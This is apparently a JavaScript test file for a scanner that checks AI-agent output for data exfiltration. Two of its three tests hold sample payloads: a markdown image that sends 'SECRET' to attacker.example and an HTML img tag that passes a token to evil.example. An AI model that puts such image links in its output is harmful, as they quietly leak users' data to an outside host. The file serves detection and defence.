import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanExfil } from '../src/outbound/exfil.js';

test('flags markdown image with remote URL as exfiltration', () => {
  const flags = scanExfil('Here is your report ![x](https://attacker.example/leak?d=SECRET)');
  assert.equal(flags.length >= 1, true);
  assert.equal(flags[0].type, 'agent_exfiltration');
  assert.equal(flags[0].action, 'block');
});
test('flags html img with remote src', () => {
  assert.equal(scanExfil('<img src="https://evil.example/pixel.png?t=abc">').length >= 1, true);
});
test('does not flag a plain markdown link or local image', () => {
  assert.equal(scanExfil('See [the docs](https://sovguard.io) and ![logo](./logo.png)').length, 0);
});
